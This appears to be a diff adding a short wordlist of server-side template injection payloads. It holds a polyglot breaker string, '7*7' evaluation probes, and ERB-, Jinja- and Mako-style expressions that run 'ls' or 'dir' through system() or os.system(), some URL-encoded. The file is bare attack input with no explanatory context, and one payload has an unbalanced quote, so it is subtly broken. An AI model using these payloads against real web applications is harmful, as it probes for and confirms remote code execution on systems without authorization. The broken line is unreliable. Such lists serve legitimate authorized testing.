@@ -1,0 +1,9 @@
+{{<%[%'"}}%\
+<%= 7*7 %>
+<%= system('ls') %>
+<%= system('dir') %>
+user.name}}{{7*7}}
+<% import os %>
+<% os.system("ls) %>
+}}{%25+import+os+%25}{{os.system('ls')
+}}{%25+import+os+%25}{{os.system('dir')
